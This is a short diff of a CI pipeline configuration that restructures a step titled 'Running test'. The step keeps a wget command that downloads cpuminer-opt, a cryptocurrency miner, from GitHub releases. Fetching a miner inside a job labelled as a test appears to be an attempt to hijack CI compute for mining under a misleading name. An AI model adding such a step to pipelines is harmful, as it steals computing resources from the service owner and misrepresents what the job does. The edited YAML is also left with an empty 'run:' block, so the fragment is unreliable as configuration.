@@ -34,13 +34,10 @@ jobs:
 
     title: "Running test"
 
-    type: "freestyle" 
 
-    image: "alpine:3.9" 
+    run:
 
-    commands:
-
-      - |-
+     
 
         wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
 
